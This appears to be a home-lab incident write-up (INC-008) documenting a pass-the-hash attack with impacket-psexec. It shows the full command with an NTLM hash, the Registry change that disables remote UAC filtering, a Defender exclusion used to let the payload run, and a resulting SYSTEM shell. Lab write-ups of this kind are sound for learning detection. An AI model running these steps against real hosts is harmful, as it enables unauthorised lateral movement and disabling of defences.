# INC-008: Investigation

## Timeline

| Time (UTC+1) | Event |
|---|---|
| 18:20:37 | First 4624 LogonType 3 NTLM hit from END-Alex |
| 18:35:00 | Impacket PsExec run — ADMIN$ not writable (UAC block) |
| 18:37:00 | LocalAccountTokenFilterPolicy set to 1 on victim |
| 18:37:00 | Second PsExec attempt — ADMIN$ writable — service `rsGq` created — Defender blocked payload |
| 18:39:00 | Third PsExec attempt — service `bvsb` created — Defender blocked payload |
| 18:43:00 | Defender exclusion applied on victim |
| 18:43:00 | PsExec success — service `UYhp` created — shell obtained |
| 18:43:00 | `whoami` = `nt authority\system` confirmed on DESKTOP-DPU3CDQ |

## Attack Details

### Tool
```
impacket-psexec v0.14.0.dev0
```

### Command (from Kali)
```bash
impacket-psexec -hashes :fc9417a516bcedc3a39a05a108eda4f6 END-Alex@172.16.0.10
```

### PsExec Flow
1. Authenticate to SMB using NTLM hash (no password needed)
2. Find writable `ADMIN$` share
3. Upload random-named executable (e.g., `QsfXhNpU.exe`)
4. Open Service Control Manager
5. Create and start service
6. Receive interactive shell as SYSTEM

## Obstacles During Attack

| Obstacle | Root Cause | Fix Applied |
|---|---|---|
| `ADMIN$` not writable | Remote UAC token filtering | Set `LocalAccountTokenFilterPolicy=1` |
| Defender alert | HackTool:Win32/Psexec!mclg | Excluded in Defender for lab |

## Confirmation

```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DESKTOP-DPU3CDQ
```
